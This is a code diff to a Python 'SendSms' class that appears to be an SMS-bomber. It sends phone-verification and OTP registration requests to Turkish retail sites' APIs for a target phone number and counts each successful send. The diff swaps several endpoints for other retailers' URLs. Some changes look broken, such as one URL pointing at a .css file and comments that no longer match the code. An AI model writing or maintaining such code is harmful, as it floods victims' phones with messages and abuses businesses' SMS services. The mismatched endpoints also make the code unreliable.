@@ -18,7 +18,7 @@ class SendSms():
     #kahvedunyasi.com
     def KahveDunyasi(self):    
         try:    
-            url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
+            url = "https://core.kahvedunyasi.com/api/users/sys/sms/send"
             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Page-Url": "/kayit-ol", "Content-Type": "application/json;charset=utf-8", "Positive-Client": "kahvedunyasi", "Positive-Client-Type": "web", "Store-Id": "1", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
             json={"mobile_number": self.phone, "token_type": "register_token"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
@@ -177,12 +177,12 @@ class SendSms():
     #bisu.com.tr
     def Bisu(self):
         try:
-            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
+            url = "https://gap.com.tr/users/register/"
             headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Device-Platform": "IOS", "X-Build-Version-Name": "9.4.0", "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e", "X-Build-Version-Code": "22", "Accept": "*/*", "X-Device-Manufacturer": "Apple", "X-Device-Locale": "en", "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Model": "iPhone 7 Plus", "X-Build-Type": "Release"}
             data = {"phoneNumber": self.phone}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["errors"] == None:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bgap.com.tr")
                 self.adet += 1
             else:
                 raise
@@ -193,12 +193,12 @@ class SendSms():
     #345dijital.com
     def Ucdortbes(self):
         try:
-            url = "https://api.345dijital.com:443/api/users/register"
+            url = "https://static.zara.net/stdstatic/6.18.1/js/v2/user-verification-phone-complete-verification-bundle.css"
             headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
             json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
-                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
+                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> static.zara.net")
             else:
                 raise
         except:
@@ -209,12 +209,12 @@ class SendSms():
     #macrocenter.com.tr
     def Macro(self):
         try:
-            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"
+            url = "https://www.beymen.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification"
             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.macrocenter.com.tr/kayit", "Content-Type": "application/json", "X-Forwarded-Rest": "true", "X-Pwa": "true", "X-Device-Pwa": "true", "Origin": "https://www.macrocenter.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
             json={"email": self.mail, "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> macrocenter.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> beymen.com")
                 self.adet += 1
             else:
                 raise
